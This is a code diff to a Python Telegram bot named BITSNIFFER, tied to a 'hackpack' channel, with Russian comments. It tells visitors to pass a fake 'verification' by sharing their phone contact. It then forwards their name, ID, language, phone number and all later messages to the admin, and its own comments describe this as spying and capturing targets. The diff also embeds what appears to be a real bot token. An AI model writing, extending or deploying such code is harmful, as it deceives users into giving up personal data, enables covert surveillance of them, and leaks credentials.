@@ -11,6 +11,9 @@ TOKEN = "8606715900:AAFGjZcI5_FiSydtLPnpu0J9QSxMHP9WezA"
 CHANNEL_ID = "@hackpackposter" 
 MY_ADMIN_ID = 7917303098 
 
+# Список верифицированных ID (в идеале — БД)
+verified_users = set()
+
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
@@ -19,6 +22,7 @@ dp = Dispatcher()
 
 def clean_and_style(text: str) -> str:
     if not text: return ""
+    # Удаляем внешние ссылки и юзернеймы для чистоты
     text = re.sub(r'http\S+', '', text)
     text = re.sub(r'@\S+', '', text)
     signature = "\n\n<b>💀 Доступ открыт в: @hackpackposter</b>"
@@ -32,7 +36,6 @@ def get_post_kb():
     return builder.as_markup()
 
 def get_auth_kb():
-    # Кнопка для захвата номера телефона
     builder = ReplyKeyboardBuilder()
     builder.row(types.KeyboardButton(text="🛡 ПРОЙТИ ВЕРИФИКАЦИЮ", request_contact=True))
     return builder.as_markup(resize_keyboard=True, one_time_keyboard=True)
@@ -44,15 +47,16 @@ async def start_handler(message: types.Message):
     u = message.from_user
     if u.id == MY_ADMIN_ID:
         await message.answer("<b>BITSNIFFER ONLINE.</b> Приветствую, мой господин.")
+    elif u.id in verified_users:
+        await message.answer("🦾 <b>Система опознала вас.</b> Добро пожаловать в узел.")
     else:
-        # Шпионаж: базовые данные
+        # Лог новой цели для админа
         report = (
             f"🚨 <b>ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
             f"<b>Имя:</b> {u.full_name}\n"
             f"<b>ID:</b> <code>{u.id}</code>\n"
-            f"<b>Premium:</b> {'Да' if u.is_premium else 'Нет'}\n"
             f"<b>Язык:</b> {u.language_code}\n"
-            f"<b>СТАТУС:</b> Ожидание контакта..."
+            f"<b>СТАТУС:</b> Ожидание верификации..."
         )
         await bot.send_message(MY_ADMIN_ID, report)
         await message.answer("🦾 <b>Система верификации.</b>\nДля доступа к базе подтвердите свою личность кнопкой ниже.", 
@@ -60,44 +64,63 @@ async def start_handler(message: types.Message):
 
 @dp.message(F.contact)
 async def contact_handler(message: types.Message):
-    # Захват номера телефона и отправка хозяину
     c = message.contact
+    
+    # ПРОВЕРКА: принадлежит ли контакт отправителю?
+    if c.user_id != message.from_user.id:
+        await message.answer("❌ <b>Ошибка верификации.</b> Вы отправили чужой контакт.")
+        await bot.send_message(MY_ADMIN_ID, f"⚠️ <b>ПОПЫТКА ОБМАНА:</b> {message.from_user.id} прислал чужой номер!")
+        return
+
+    # Захват данных
+    verified_users.add(message.from_user.id)
+    
     intel_report = (
-        f"🎯 <b>ЦЕЛЬ РАСКРЫТА (PHONE CAPTURE)</b>\n"
+        f"🎯 <b>ЦЕЛЬ РАСКРЫТА (VERIFIED)</b>\n"
         f"━━━━━━━━━━━━━━\n"
         f"<b>Номер:</b> +{c.phone_number}\n"
         f"<b>Имя:</b> {c.first_name}\n"
-        f"<b>ID пользователя:</b> {c.user_id}\n"
+        f"<b>User ID:</b> <code>{c.user_id}</code>\n"
         f"━━━━━━━━━━━━━━"
     )
     await bot.send_message(MY_ADMIN_ID, intel_report)
-    await message.answer("✅ <b>Верификация пройдена.</b> Доступ к узлу открыт.", 
+    await message.answer("✅ <b>Верификация пройдена.</b> Личность подтверждена.", 
                          reply_markup=types.ReplyKeyboardRemove())
 
 @dp.message()
 async def posting_handler(message: types.Message):
-    if message.from_user.id == MY_ADMIN_ID:
+    u_id = message.from_user.id
+    
+    # 1. Если пишет админ — постим в канал
+    if u_id == MY_ADMIN_ID:
         try:
             text = clean_and_style(message.text or message.caption or "")
             kb = get_post_kb()
-            if message.text:
-                await bot.send_message(CHANNEL_ID, text, reply_markup=kb)
-            elif message.photo:
+            
+            if message.photo:
                 await bot.send_photo(CHANNEL_ID, message.photo[-1].file_id, caption=text, reply_markup=kb)
             elif message.video:
                 await bot.send_video(CHANNEL_ID, message.video.file_id, caption=text, reply_markup=kb)
             elif message.document:
                 await bot.send_document(CHANNEL_ID, message.document.file_id, caption=text, reply_markup=kb)
-            await message.answer("🚀 <b>Пост отправлен!</b>")
+            else:
+                await bot.send_message(CHANNEL_ID, text, reply_markup=kb)
+                
+            await message.answer("🚀 <b>Пост отправлен в HackPack!</b>")
         except Exception as e:
             await message.answer(f"❌ Ошибка: {e}")
-    else:
-        # Перехват сообщений от посторонних
-        spy_msg = f"📩 <b>Перехват от {message.from_user.id}:</b>\n{message.text or 'Медиа'}"
+            
+    # 2. Если пишет верифицированный юзер — просто логируем (шпионаж)
+    elif u_id in verified_users:
+        spy_msg = f"👤 <b>Сообщение от верифицированного ({u_id}):</b>\n{message.text or 'Медиа-файл'}"
         await bot.send_message(MY_ADMIN_ID, spy_msg)
+        
+    # 3. Если пишет аноним без верификации — требуем контакт
+    else:
+        await message.answer("⚠️ <b>Доступ заблокирован.</b> Сначала пройдите верификацию через /start.")
 
 async def main():
-    print(f"--- BITSNIFFER v3.5 ONLINE ---")
+    print(f"--- BITSNIFFER v3.6 ONLINE (Tbilisi Node) ---")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
